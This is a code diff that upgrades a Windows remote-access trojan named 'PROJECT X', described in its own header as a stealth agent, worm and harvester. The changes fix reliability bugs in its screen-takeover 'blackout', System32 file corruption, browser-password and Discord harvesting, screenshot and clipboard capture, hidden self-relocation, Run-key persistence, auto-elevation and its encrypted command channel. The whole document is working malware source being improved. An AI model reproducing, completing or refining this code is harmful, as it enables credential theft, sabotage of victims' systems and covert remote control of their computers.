@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
 # ============================================================================
-#  PROJECT X  ·  x.pyw  v4  ·  encrypted stealth agent + worm + harvester
+#  PROJECT X  ·  x.pyw  v4.1  ·  encrypted stealth agent + worm + harvester
 #  Pure stdlib. One file. Encrypt-then-MAC transport. Watchdog supervisor.
 #  Flags: --run (stay put) | --install | --uninstall | --check | --watchdog
 # ============================================================================
-import base64, ctypes, glob, hashlib, hmac, json, os, re, shutil, socket
-import sqlite3, struct, subprocess, sys, tempfile, threading, time, uuid, zlib
+import base64, collections, ctypes, glob, hashlib, hmac, json, os, re, shutil
+import socket, sqlite3, struct, subprocess, sys, tempfile, threading, time, uuid, zlib
 
 IS_WIN   = os.name == "nt"
 NO_REPLY = object()
@@ -53,6 +53,44 @@ RUN_MODE = "--run" in sys.argv
 ORIG_DIR = None
 try:    SRC = open(SELF, "rb").read()
 except Exception: SRC = None
+
+# ------------------------------------------------------- win32 prototypes ---
+def _win32_protos():
+    """Pin 64-bit-correct prototypes. ctypes.windll defaults restype to c_int,
+       which silently truncates HDC / HANDLE / HGLOBAL on x64."""
+    k, u, g = ctypes.windll.kernel32, ctypes.windll.user32, ctypes.windll.gdi32
+    VP = ctypes.c_void_p
+    k.OpenProcess.restype = VP
+    k.OpenProcess.argtypes = [ctypes.c_uint, ctypes.c_int, ctypes.c_uint]
+    k.CloseHandle.argtypes = [VP]
+    k.GetExitCodeProcess.argtypes = [VP, ctypes.POINTER(ctypes.c_ulong)]
+    k.CreateMutexW.restype = VP
+    k.CreateMutexW.argtypes = [VP, ctypes.c_int, ctypes.c_wchar_p]
+    k.GlobalLock.restype = VP
+    k.GlobalLock.argtypes = [VP]
+    k.GlobalUnlock.argtypes = [VP]
+    k.GlobalAlloc.restype = VP
+    k.GlobalAlloc.argtypes = [ctypes.c_uint, ctypes.c_size_t]
+    k.GlobalFree.argtypes = [VP]
+    u.GetClipboardData.restype = VP
+    u.GetDC.restype = VP
+    u.GetDC.argtypes = [VP]
+    u.ReleaseDC.argtypes = [VP, VP]
+    g.CreateCompatibleDC.restype = VP
+    g.CreateCompatibleDC.argtypes = [VP]
+    g.CreateCompatibleBitmap.restype = VP
+    g.CreateCompatibleBitmap.argtypes = [VP, ctypes.c_int, ctypes.c_int]
+    g.SelectObject.restype = VP
+    g.SelectObject.argtypes = [VP, VP]
+    g.DeleteObject.argtypes = [VP]
+    g.DeleteDC.argtypes = [VP]
+    g.BitBlt.argtypes = [VP, ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_int,
+                         VP, ctypes.c_int, ctypes.c_int, ctypes.c_uint]
+    g.GetDIBits.argtypes = [VP, VP, ctypes.c_uint, ctypes.c_uint, VP, VP, ctypes.c_uint]
+
+if IS_WIN:
+    _win32_protos()
+
 # ---- PROJECT X extras: screen takeover + system corruption ----
 _BLACKOUT = {"on": False, "stop": False}
 
@@ -62,6 +100,7 @@ def px_blackout(args=None):
     op = (args.get("op") or "on").lower()
     if op in ("off", "0", "false"):
         _BLACKOUT["stop"] = True
+        _BLACKOUT["on"] = False
         return "blackout off"
     if _BLACKOUT["on"]:
         return "blackout already on"
@@ -74,28 +113,33 @@ def px_blackout(args=None):
     size  = int(args.get("size") or 100)
 
     def ui():
-        root = tk.Tk()
-        root.configure(bg="black")
-        root.overrideredirect(True)              # no title bar, no border
-        root.attributes("-fullscreen", True)
-        root.attributes("-topmost", True)
-        root.config(cursor="none")               # hide the mouse pointer
-        tk.Label(root, text=title, fg="#00ff88", bg="black",
-                 font=("Consolas", size, "bold")).pack(expand=True)
-        tk.Label(root, text="press ESC to exit", fg="#3a3a3a", bg="black",
-                 font=("Consolas", 16)).pack(side="bottom", pady=28)
-        root.bind("<Escape>", lambda e: root.destroy())
-        def tick():
-            if _BLACKOUT["stop"]:
-                root.destroy(); return
-            root.after(200, tick)
-        tick()
-        root.lift(); root.focus_force(); root.mainloop()
-        _BLACKOUT["on"] = False
+        try:
+            root = tk.Tk()
+            root.configure(bg="black")
+            root.overrideredirect(True)              # no title bar, no border
+            root.attributes("-fullscreen", True)
+            root.attributes("-topmost", True)
+            root.config(cursor="none")               # hide the mouse pointer
+            tk.Label(root, text=title, fg="#00ff88", bg="black",
+                     font=("Consolas", size, "bold")).pack(expand=True)
+            tk.Label(root, text="press ESC to exit", fg="#3a3a3a", bg="black",
+                     font=("Consolas", 16)).pack(side="bottom", pady=28)
+            root.bind("<Escape>", lambda e: root.destroy())
+            def tick():
+                if _BLACKOUT["stop"]:
+                    root.destroy(); return
+                root.after(200, tick)
+            tick()
+            root.lift(); root.focus_force(); root.mainloop()
+        except Exception:
+            pass
+        finally:
+            _BLACKOUT["on"] = False          # never get stuck "already on"
 
     _BLACKOUT.update(on=True, stop=False)
     threading.Thread(target=ui, daemon=True).start()
     return "blackout on"
+
 def _sys32():
     root = os.environ.get("SystemRoot", r"C:\Windows")
     native = os.path.join(root, "Sysnative")     # only exists for 32-bit procs
@@ -118,7 +162,6 @@ def px_corrupt(args=None):
         except PermissionError:
             return "access denied - run 'elevate' first"
         except OSError:                          # locked by the running system
-            import ctypes
             ok = ctypes.windll.kernel32.MoveFileExW(p, bak, 0x4)  # DELAY_UNTIL_REBOOT
             return "rename scheduled for next reboot" if ok else "rename failed"
         return "renamed %s -> %s.px_bak" % (name, name)
@@ -134,17 +177,23 @@ def px_corrupt(args=None):
         if os.path.exists(p):
             try: os.remove(p)
             except PermissionError: return "target busy - reboot then restore"
-        os.rename(bak, p)
+        try:
+            os.rename(bak, p)
+        except PermissionError:
+            return "access denied - run 'elevate' first"
+        except OSError as e:
+            return "restore failed: %s" % e
         return "restored " + name
 
     return "op must be rename|delete|restore"
+
 # ------------------------------------------------------------------ crypto ---
 def _derive(passphrase, salt=b"projectx-v1", iters=60000):
     dk = hashlib.pbkdf2_hmac("sha256", passphrase.encode("utf-8"), salt, iters, dklen=64)
     return dk[:32], dk[32:]                       # separate enc + mac keys
 
 EK, MK = _derive(CFG["passphrase"], iters=CFG["kdf_iters"])
-_RX = set()
+_RX, _RXQ = set(), collections.deque()
 _RX_LOCK = threading.Lock()
 
 def _ks(key, nonce, n):
@@ -173,8 +222,8 @@ def unseal(blob, replay=True):
     if replay:
         with _RX_LOCK:
             if nonce in _RX: raise ValueError("replay")
-            _RX.add(nonce)
-            if len(_RX) > 8192: _RX.clear()
+            _RX.add(nonce); _RXQ.append(nonce)
+            if len(_RXQ) > 8192: _RX.discard(_RXQ.popleft())   # ring, not clear()
     return json.loads(_xorb(ct, _ks(EK, nonce, len(ct))).decode())
 
 # ----------------------------------------------------------------- helpers ---
@@ -229,11 +278,12 @@ def launch_line():
 
 def proc_alive(pid):
     try:
-        h = ctypes.windll.kernel32.OpenProcess(0x1000, False, int(pid))
+        k = ctypes.windll.kernel32
+        h = k.OpenProcess(0x1000, False, int(pid))
         if not h: return False
         code = ctypes.c_ulong()
-        ctypes.windll.kernel32.GetExitCodeProcess(h, ctypes.byref(code))
-        ctypes.windll.kernel32.CloseHandle(h)
+        k.GetExitCodeProcess(ctypes.c_void_p(h), ctypes.byref(code))
+        k.CloseHandle(ctypes.c_void_p(h))
         return code.value == 259
     except Exception: return False
 
@@ -300,14 +350,13 @@ def active_window():
 def clipboard():
     try:
         u, k = ctypes.windll.user32, ctypes.windll.kernel32
-        u.GetClipboardData.restype = ctypes.c_void_p
         if not u.OpenClipboard(0): return ""
-        h = u.GetClipboardData(13)
+        h = u.GetClipboardData(13)                 # CF_UNICODETEXT
         if not h:
             u.CloseClipboard(); return ""
-        p = k.GlobalLock(h)
-        txt = ctypes.c_wchar_p(p).value or "" if p else ""
-        k.GlobalUnlock(h); u.CloseClipboard()
+        p = k.GlobalLock(ctypes.c_void_p(h))
+        txt = (ctypes.c_wchar_p(p).value or "") if p else ""
+        k.GlobalUnlock(ctypes.c_void_p(h)); u.CloseClipboard()
         return txt[:400]
     except Exception: return ""
 
@@ -373,7 +422,10 @@ def _gmul(x, y):
         v = (v >> 1) ^ 0xE1000000000000000000000000000000 if v & 1 else v >> 1
     return z
 
-def aes_gcm_dec(key, blob):
+def aes_gcm_dec(key, blob, verify=True):
+    """AES-256-GCM decrypt. blob = nonce(12) || ct || tag(16).
+       verify=True authenticates the tag (fixed: was computed and discarded)."""
+    if len(blob) < 28: raise ValueError("short gcm blob")
     nonce, ct, tag = blob[:12], blob[12:-16], blob[-16:]
     w, nr = _expand(key)
     j0 = int.from_bytes(nonce + b"\x00\x00\x00\x01", "big")
@@ -382,11 +434,17 @@ def aes_gcm_dec(key, blob):
         ks = _eblk(w, nr, ctr.to_bytes(16, "big"))
         out += bytes(a ^ b for a, b in zip(ct[i:i+16], ks))
         ctr += 1
-    h = int.from_bytes(_eblk(w, nr, b"\x00"*16), "big")
-    pad = ct + b"\x00" * (-len(ct) % 16) + (len(ct)*8).to_bytes(8, "big") + b"\x00"*8
-    s = 0
-    for i in range(0, len(pad), 16):
-        s = _gmul(s ^ int.from_bytes(pad[i:i+16], "big"), h)
+    if verify:
+        h = int.from_bytes(_eblk(w, nr, b"\x00"*16), "big")
+        # GHASH: [AAD padded][C padded][len(A) || len(C)]  -- fixed byte order
+        pad = (ct + b"\x00" * (-len(ct) % 16)
+               + b"\x00" * 8 + (len(ct) * 8).to_bytes(8, "big"))
+        s = 0
+        for i in range(0, len(pad), 16):
+            s = _gmul(s ^ int.from_bytes(pad[i:i+16], "big"), h)
+        ej0 = int.from_bytes(_eblk(w, nr, j0.to_bytes(16, "big")), "big")
+        if (ej0 ^ s).to_bytes(16, "big") != tag:
+            raise ValueError("gcm tag mismatch")
     return bytes(out)
 
 def dpapi(data):
@@ -404,8 +462,16 @@ def dpapi(data):
     return out
 
 def crypto_selftest():
-    return aes_gcm_dec(b"\x00"*32, b"\x00"*12
-                       + bytes.fromhex("530f8afbc74536b9a963b4f1c4cb738b")) == b""
+    """NIST AES-256-GCM Test Case 14 - zero key/IV, 16-byte zero plaintext.
+       Exercises key expansion, CTR and GHASH (the old version used an empty
+       ciphertext and proved nothing)."""
+    blob = (b"\x00" * 12
+            + bytes.fromhex("cea7403d4d606b6e074ec5d3baf39d18")   # C
+            + bytes.fromhex("d0d1c8a799996bf0265b98b5d48ab919"))  # T
+    try:
+        return aes_gcm_dec(b"\x00" * 32, blob) == b"\x00" * 16
+    except Exception:
+        return False
 
 # ============================================================================
 #  HARVEST
@@ -452,7 +518,7 @@ def harvest_passwords(limit=500):
                     if not user and not pw: continue
                     out.append({"browser": name, "profile": prof, "url": url,
                                 "user": user, "pass": _bdec(key, pw)})
-            break
+            # NOTE: no break here - some browsers keep data under Roaming only
     return out
 
 def harvest_discord():
@@ -520,8 +586,10 @@ def harvest_files():
 def screenshot_png():
     u, g = ctypes.windll.user32, ctypes.windll.gdi32
     w, h = u.GetSystemMetrics(0), u.GetSystemMetrics(1)
-    hdc = u.GetDC(0); mdc = g.CreateCompatibleDC(hdc); bmp = g.CreateCompatibleBitmap(hdc, w, h)
-    g.SelectObject(mdc, bmp); g.BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, 0x00CC0020)
+    hdc = u.GetDC(None); mdc = g.CreateCompatibleDC(ctypes.c_void_p(hdc))
+    bmp = g.CreateCompatibleBitmap(ctypes.c_void_p(hdc), w, h)
+    g.SelectObject(ctypes.c_void_p(mdc), ctypes.c_void_p(bmp))
+    g.BitBlt(ctypes.c_void_p(mdc), 0, 0, w, h, ctypes.c_void_p(hdc), 0, 0, 0x00CC0020)
     import ctypes.wintypes as wt
     class BIH(ctypes.Structure):
         _fields_ = [("biSize", wt.DWORD), ("biWidth", ctypes.c_long), ("biHeight", ctypes.c_long),
@@ -532,8 +600,11 @@ def screenshot_png():
     bi.biPlanes, bi.biBitCount, bi.biCompression = 1, 24, 0
     stride = ((w * 3 + 3) // 4) * 4
     buf = ctypes.create_string_buffer(stride * h)
-    g.GetDIBits(mdc, bmp, 0, h, buf, ctypes.byref(bi), 0)
-    g.DeleteObject(bmp); g.DeleteDC(mdc); u.ReleaseDC(0, hdc)
+    g.GetDIBits(ctypes.c_void_p(mdc), ctypes.c_void_p(bmp), 0, h,
+                ctypes.cast(buf, ctypes.c_void_p),
+                ctypes.cast(ctypes.byref(bi), ctypes.c_void_p), 0)
+    g.DeleteObject(ctypes.c_void_p(bmp)); g.DeleteDC(ctypes.c_void_p(mdc))
+    u.ReleaseDC(None, ctypes.c_void_p(hdc))
     raw = bytearray()
     for y in range(h):
         raw.append(0)
@@ -560,7 +631,10 @@ def relocate():
     tpy = os.path.join(ROOT, TAG + EXT); tbin = os.path.join(ROOT, TAG + ".exe")
     tvbs = os.path.join(ROOT, TAG + ".vbs"); thome = os.path.join(ROOT, "pyhome.txt")
     os.makedirs(ROOT, exist_ok=True); hide(ROOT)
-    shutil.copy2(SELF, tpy)
+    try: shutil.copy2(SELF, tpy)                      # frozen: __file__ may not exist
+    except Exception:
+        try: shutil.copy2(self_path(), tpy)
+        except Exception: pass
     exe = sys.executable; ORIG_DIR = os.path.dirname(exe)
     try: open(thome, "w").write(ORIG_DIR)
     except Exception: pass
@@ -645,10 +719,13 @@ def runkey_ok():
             return winreg.QueryValueEx(k, RUNKEY)[0] == launch_line()
     except Exception: return False
 
+_MUTEX = None
+
 def single_instance():
-    ctypes.windll.kernel32.CreateMutexW(None, False,
-        f"Global\\{TAG}-{'adm' if is_admin() else 'usr'}")
-    return ctypes.windll.kernel32.GetLastError() != 183
+    global _MUTEX
+    k = ctypes.windll.kernel32
+    _MUTEX = k.CreateMutexW(None, False, f"Global\\{TAG}-{'adm' if is_admin() else 'usr'}")
+    return k.GetLastError() != 183
 
 def auto_elevate():
     if not CFG.get("auto_elevate") or is_admin() or os.path.exists(MARKF): return
@@ -736,7 +813,7 @@ class Agent:
 
     def hello(self):
         import platform
-        return {"id": self.id, "tag": TAG, "version": "4.0", "proto": 1,
+        return {"id": self.id, "tag": TAG, "version": "4.1", "proto": 1,
                 "host": socket.gethostname(), "user": os.environ.get("USERNAME", "?"),
                 "domain": os.environ.get("USERDOMAIN", ""),
                 "os": f"{platform.system()} {platform.release()}", "arch": platform.machine(),
@@ -883,8 +960,11 @@ class Agent:
                        "data": base64.b64encode(data[i*CH:(i+1)*CH]).decode()})
         return {"name": name, "size": len(data), "chunks": tot}
     def c_put_start(self, a, x):
-        self.put = {"path": a["path"], "tmp": a["path"] + ".pxpart"}
-        self.put["fh"] = open(self.put["tmp"], "wb"); return NO_REPLY
+        p = a["path"]; d = os.path.dirname(p)
+        if d: os.makedirs(d, exist_ok=True)
+        self.put = {"path": p, "tmp": p + ".pxpart"}
+        self.put["fh"] = open(self.put["tmp"], "wb")
+        return "started"                     # FIX: was NO_REPLY -> controller stalled
     def c_put_chunk(self, a, x):
         self.put["fh"].write(base64.b64decode(a["data"])); return NO_REPLY
     def c_put_end(self, a, x):
@@ -941,13 +1021,19 @@ class Agent:
         if a.get("set") is not None: self.set_clip(a["set"]); return "set"
         return clipboard()
     def set_clip(self, text):
+        """FIX: allocate a real movable HGLOBAL; the old version handed Windows a
+           Python buffer that could be freed underneath the clipboard."""
         u, k = ctypes.windll.user32, ctypes.windll.kernel32
         if not u.OpenClipboard(0): return
-        u.EmptyClipboard()
-        b = ctypes.create_unicode_buffer(text)
-        u.SetClipboardData(13, ctypes.cast(b, ctypes.c_void_p))
-        k.GlobalUnlock(ctypes.cast(b, ctypes.c_void_p))
-        u.CloseClipboard()
+        try:
+            u.EmptyClipboard()
+            data = text.encode("utf-16-le") + b"\x00\x00"
+            h = k.GlobalAlloc(0x0002, len(data))            # GMEM_MOVEABLE
+            ctypes.memmove(k.GlobalLock(ctypes.c_void_p(h)), data, len(data))
+            k.GlobalUnlock(ctypes.c_void_p(h))
+            u.SetClipboardData(13, ctypes.c_void_p(h))
+        finally:
+            u.CloseClipboard()
     def c_reg(self, a, x):
         import winreg
         hive = {"HKCU": winreg.HKEY_CURRENT_USER, "HKLM": winreg.HKEY_LOCAL_MACHINE}.get(
@@ -1154,7 +1240,7 @@ class Agent:
 #  MAIN
 # ============================================================================
 def check():
-    print(f"version   : 4.0")
+    print(f"version   : 4.1")
     print(f"entry     : {self_path()}")
     print(f"workdir   : {WDIR}")
     print(f"admin     : {is_admin()}")
